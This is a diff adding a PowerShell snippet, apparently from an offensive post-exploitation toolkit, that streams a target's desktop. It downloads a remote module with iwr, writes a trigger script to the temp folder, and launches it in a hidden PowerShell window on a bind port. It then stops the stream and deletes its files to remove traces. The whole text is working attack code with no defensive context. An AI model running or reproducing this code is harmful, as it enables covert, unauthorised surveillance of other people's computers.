@@ -1,0 +1,13 @@
+#stream target desktop
+iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Stream-TargetDesktop.ps1 -OutFile $Env:TMP\Stream-TargetDesktop.ps1
+echo "Import-Module -Name $Env:TMP\Stream-TargetDesktop.ps1 -Force"|Out-File -FilePath "$Env:TMP\trigger.ps1" -Encoding ascii -Force
+Add-Content $Env:TMP\trigger.ps1 "TargetScreen -Bind -Port $BindPort"
+Start-Process -WindowStyle hidden powershell -ArgumentList "-File $Env:TMP\trigger.ps1"
+
+#Stop stream
+$StreamPid = Get-Content -Path "$Env:TMP\mypid.log" -EA SilentlyContinue|Where-Object { $_ -ne '' }
+Stop-Process -id $StreamPid -EA SilentlyContinue -Force
+
+#CleanUp
+Remove-Item -Path `$Env:TMP\trigger.ps1 -Force;
+Remove-Item -Path `$Env:TMP\mypid.log -Force;
